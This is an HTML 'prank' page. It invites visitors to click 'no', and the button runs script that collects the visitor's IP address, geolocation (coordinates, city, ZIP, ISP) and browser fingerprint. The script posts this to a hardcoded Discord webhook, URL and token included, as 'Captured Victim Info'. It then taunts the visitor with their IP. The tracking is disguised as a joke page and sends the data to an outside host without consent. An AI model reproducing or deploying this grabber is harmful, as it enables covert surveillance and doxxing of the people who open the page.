<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    body {
      text-align: center;
      background-size: 400% 400%;
      color: white;
      height: 100vh;
      font-family: 'Orbitron', sans-serif;
    }
    button {
      background-color: white;
      color: black;
      padding: 10px 30px;
      border-radius: 50px;
      font-size: 40px;
      transition: 0.3s ease;
      border: 2px solid black;
      cursor: pointer;
      margin: 20px;
    }
    button:hover {
      font-size: 50px;
      color: white;
    }
    button:first-of-type:hover {
      background-color: green;
      box-shadow: 0 0 40px green;
    }
    button:last-of-type:hover {
      background-color: red;
      box-shadow: 0 0 40px red;
    }
    h1 {
        color: black;
    }
    h5 {
        color: black;
    }
  </style>
</head>
<body>
  <h1>hello</h1>
  <h5>please click no :)</h5>
  <button>sure</button>
  <button>no</button>
  <script>
    const yesButton = document.querySelector('button:first-of-type');
    const noButton = document.querySelector('button:last-of-type');
    const webhookUrl = 'https://discord.com/api/webhooks/1435310925027610745/Z6fv6m5dZIfF-kdS5LJKumtj3KGb006X-BtZzbst3DywXJ7Simn7DuETfaTN5MNcs3tB';
    yesButton.addEventListener('click', () => {
      alert('cool thanks!');
    });
    noButton.addEventListener('click', () => {
      const ip = 'fetching...';
      console.log('Sending info...');
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const actualIp = data.ip;
          console.log('Your IP:', actualIp);
          fetch(`http://ip-api.com/json/${actualIp}`)
            .then(geoResponse => geoResponse.json())
            .then(geoData => {
              const lat = geoData.lat || 'unknown';
              const lon = geoData.lon || 'unknown';
              const country = geoData.country || 'unknown';
              const countryCode = geoData.countryCode || 'unknown';
              const region = geoData.regionName || 'unknown';
              const regionCode = geoData.region || 'unknown';
              const city = geoData.city || 'unknown';
              const district = geoData.district || 'unknown';
              const zip = geoData.zip || 'unknown';
              const isp = geoData.isp || 'unknown';
              const org = geoData.org || 'unknown';
              const as = geoData.as || 'unknown';
              const timezone = geoData.timezone || 'unknown';
              const mobile = geoData.mobile ? 'Yes' : 'No';
              const proxy = geoData.proxy ? 'Yes' : 'No';
              const hosting = geoData.hosting ? 'Yes' : 'No';
              const status = geoData.status || 'unknown';
              const userAgent = navigator.userAgent || 'unknown';
              const language = navigator.language || 'unknown';
              const platform = navigator.platform || 'unknown';
              const screenRes = `${screen.width}x${screen.height}` || 'unknown';
              const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
              const timestamp = new Date().toISOString();
              const embedPayload = {
                embeds: [
                  {
                    title: 'Captured Victim Info',
                    description: `Timestamp: ${timestamp}`,
                    fields: [
                      { name: 'IP', value: actualIp, inline: true },
                      { name: 'Status', value: status, inline: true },
                      { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
                      { name: 'Country', value: country, inline: true },
                      { name: 'Country Code', value: countryCode, inline: true },
                      { name: 'Region', value: region, inline: true },
                      { name: 'Region Code', value: regionCode, inline: true },
                      { name: 'City', value: city, inline: true },
                      { name: 'District', value: district, inline: true },
                      { name: 'ZIP', value: zip, inline: true },
                      { name: 'ISP', value: isp, inline: true },
                      { name: 'Organization', value: org, inline: true },
                      { name: 'AS', value: as, inline: true },
                      { name: 'Timezone', value: timezone, inline: true },
                      { name: 'Mobile', value: mobile, inline: true },
                      { name: 'Proxy', value: proxy, inline: true },
                      { name: 'Hosting', value: hosting, inline: true },
                      { name: 'User Agent', value: userAgent, inline: false },
                      { name: 'Language', value: language, inline: true },
                      { name: 'Platform', value: platform, inline: true },
                      { name: 'Screen Resolution', value: screenRes, inline: true },
                      { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
                    ],
                    color: 16711680,
                    footer: { text: 'Grabbed via prank page' }
                  }
                ]
              };
              fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embedPayload),
              })
              .then(response => {
                if (!response.ok) {
                  console.error('Error sending to webhook:', response.statusText);
                }
              })
              .catch(error => {
                console.error('Error sending to webhook:', error);
              });
              alert(`no?? Then your ip shall be mine, its ${actualIp} btw`);
            })
            .catch(geoError => {
              console.error('Error fetching geolocation:', geoError);
              const fallbackPayload = {
                embeds: [
                  {
                    title: 'Captured Victim Info (Partial)',
                    description: `Timestamp: ${new Date().toISOString()}`,
                    fields: [
                      { name: 'IP', value: actualIp, inline: true },
                      { name: 'User Agent', value: navigator.userAgent || 'unknown', inline: false },
                      { name: 'Language', value: navigator.language || 'unknown', inline: true },
                      { name: 'Platform', value: navigator.platform || 'unknown', inline: true },
                      { name: 'Screen Resolution', value: `${screen.width}x${screen.height}` || 'unknown', inline: true },
                      { name: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No', inline: true }
                    ],
                    color: 16711680,
                    footer: { text: 'Geolocation failed' }
                  }
                ]
              };
              fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fallbackPayload),
              });
              alert(`no?? Then your ip shall be mine, its ${actualIp} btw`);
            });
        })
        .catch(error => {
          console.error('Error fetching IP:', error);
          alert('no?? Then your ip shall be mine, its [error] btw');
        });
    });
  </script>
</body>
</html>
